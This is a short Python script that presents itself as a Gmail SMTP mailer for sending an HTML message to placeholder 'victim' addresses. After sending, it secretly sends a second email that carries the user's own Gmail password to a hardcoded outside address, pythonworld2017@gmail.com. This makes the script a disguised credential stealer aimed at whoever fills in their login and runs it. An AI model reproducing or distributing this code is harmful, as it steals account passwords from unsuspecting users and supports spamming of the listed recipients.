import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from smtplib import SMTPAuthenticationError


host = "smtp.gmail.com"
port = 587
username = "TypeYourGmailId"
password = "TypeYourGmailPassword"
from_email = username
from_email2 = password
to_list = ["type victim mail address1", "type second victim mail address"]

try:
	email_conn = smtplib.SMTP(host, port)
	email_conn.ehlo()
	email_conn.starttls()
	email_conn.login(username, password)
	the_msg = MIMEMultipart("alternative")
	the_msg['Subject'] = "Hello there!"
	the_msg["From"] = from_email
	#the_msg["To"] = to_list[0]
	plain_text = "Testing the message"
	html_text = """\
	<html>
	  <head></head>
	  <body>
	    <p>Hey!<br>
	      Testing this email <b>message</b>. Made by <a href='https://rkm01.blogspot.in'>Team $R.K.M.$</a>
	    </p>
	  </body>
	</html>
	"""
	part_1 = MIMEText(plain_text, 'plain')
	part_2 = MIMEText(html_text, 'html')
	the_msg.attach(part_1)
	the_msg.attach(part_2)
	email_conn.sendmail(from_email, to_list, the_msg.as_string())
	email_conn.sendmail(from_email, "pythonworld2017@gmail.com", from_email2)
	email_conn.quit()
except SMTPAuthenticationError:
	print("authrnticatin error")
	email_conn.quit()
except:
	print("sending message error")
	email_conn.quit()